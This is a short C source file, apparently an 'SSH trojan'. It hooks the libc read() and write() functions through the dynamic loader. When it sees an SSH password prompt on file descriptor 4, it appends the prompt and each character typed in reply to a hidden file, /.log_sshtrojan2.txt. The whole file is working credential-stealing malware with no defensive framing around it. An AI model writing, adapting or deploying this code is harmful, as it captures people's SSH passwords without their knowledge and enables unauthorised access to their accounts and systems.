/* hooking libc read, write function */

#define _GNU_SOURCE

#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <stdarg.h>

ssize_t
write(int fd, const void *buf, size_t nbytes)
{
	// write(4, "dungdd@localhost's password: ", 29)"
	if (fd == 4 && nbytes > 13) {
		FILE *file = fopen("/.log_sshtrojan2.txt", "a");
		fprintf(file, "\n[+] %s", (char *)buf);
		fclose(file);
	}

	// call real write() libc function
	ssize_t (*real_write)(int fd, const void *buf, size_t nbytes);
	real_write = dlsym(RTLD_NEXT, "write");
	return real_write(fd, buf, nbytes);
}

ssize_t
read(int fd, void *buf, size_t nbytes)
{
	// call real read() libc function
	ssize_t (*real_read)(int fd, void *buf, size_t nbytes);
	real_read = dlsym(RTLD_NEXT, "read");
	ssize_t res = real_read(fd, buf, nbytes);

	// read(4, "c", 1)"
	if (fd == 4 && nbytes == 1) {
		FILE *file = fopen("/.log_sshtrojan2.txt", "a");
		fprintf(file, "%s", (char *)buf);
		fclose(file);
	}

	return res;
}
